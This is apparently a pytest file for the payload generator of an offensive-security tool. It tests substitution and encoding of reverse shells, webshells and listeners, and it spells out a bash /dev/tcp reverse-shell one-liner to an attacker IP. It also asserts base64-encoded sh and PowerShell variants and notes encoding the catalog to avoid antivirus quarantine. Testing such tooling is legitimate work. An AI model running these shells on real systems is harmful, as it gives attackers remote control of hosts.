"""Tests for the curated payload generator. Run without Ollama or any tools."""
import base64

import pytest

from ghostops.payloads.generator import (
    DEFAULT_PAYLOAD,
    PayloadError,
    catalog_available,
    categories,
    generate,
    list_payloads,
)

# The plaintext catalog is quarantined by antivirus on some dev hosts (Windows
# Defender). Where no catalog form is present, skip these rather than fail the
# whole suite - the generator logic is unchanged, only its data is missing.
pytestmark = pytest.mark.skipif(
    not catalog_available(),
    reason="payload catalog not present on disk (AV quarantine? ship payloads.b64)",
)


def test_catalog_loads_and_is_nonempty():
    cats = categories()
    assert {"revshell", "webshell", "listener"}.issubset(set(cats))
    assert len(list_payloads()) > 20
    # every default points at a real entry
    for cat, key in DEFAULT_PAYLOAD.items():
        p = generate(cat, key, lhost="10.0.0.1", lport="4444")
        assert p.ref == f"{cat}/{key}"


def test_revshell_substitution():
    p = generate("revshell", "bash", lhost="10.10.14.5", lport="4444")
    assert p.body == "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"
    assert "{lhost}" not in p.body and "{lport}" not in p.body


def test_shell_placeholder_default_and_override():
    default = generate("revshell", "python3", lhost="1.2.3.4", lport="9001")
    assert '"1.2.3.4"' in default.body and "/bin/bash" in default.body
    custom = generate("revshell", "python3", lhost="1.2.3.4", lport="9001",
                      shell="/bin/sh")
    assert '"/bin/sh"' in custom.body


def test_missing_required_placeholder_raises():
    with pytest.raises(PayloadError):
        generate("revshell", "bash", lport="4444")   # no lhost
    with pytest.raises(PayloadError):
        generate("revshell", "bash", lhost="10.0.0.1")  # no lport


def test_unknown_category_and_name_raise():
    with pytest.raises(PayloadError):
        generate("nope", "bash", lhost="1.1.1.1", lport="1")
    with pytest.raises(PayloadError):
        generate("revshell", "no-such-shell", lhost="1.1.1.1", lport="1")


def test_webshell_param_substitution_and_no_conn_needed():
    p = generate("webshell", "php", param="x")
    assert "$_REQUEST['x']" in p.body
    assert p.runner == "none"


def test_encode_sh_roundtrips():
    p = generate("revshell", "bash", lhost="10.0.0.9", lport="53", encode=True)
    assert p.body.startswith("echo ") and "base64 -d | sh" in p.body
    b64 = p.body.split()[1]
    decoded = base64.b64decode(b64).decode("utf-8")
    assert decoded == "bash -i >& /dev/tcp/10.0.0.9/53 0>&1"


def test_encode_powershell_is_utf16le():
    p = generate("revshell", "powershell", lhost="10.0.0.9", lport="443",
                 encode=True)
    assert p.body.startswith("powershell ") and "-Enc " in p.body
    b64 = p.body.split()[-1]
    decoded = base64.b64decode(b64).decode("utf-16-le")
    assert "10.0.0.9" in decoded and "TCPClient" in decoded


def test_encode_rejects_non_runner_payloads():
    with pytest.raises(PayloadError):
        # listeners run on the attacker box; encoding is meaningless
        generate("listener", "nc", lport="4444", encode=True)


def test_templates_with_literal_braces_survive():
    # Non-placeholder braces (PowerShell's |%{0}, awk blocks) must pass through
    # untouched - proof that we do literal replacement, not str.format (which
    # would choke on these). The placeholders themselves are still filled.
    ps = generate("revshell", "powershell", lhost="1.1.1.1", lport="2")
    assert "1.1.1.1" in ps.body           # placeholder substituted
    assert "|%{0}" in ps.body             # literal PowerShell brace intact
    awk = generate("revshell", "awk", lhost="1.1.1.1", lport="2")
    assert "while(42)" in awk.body and "1.1.1.1" in awk.body
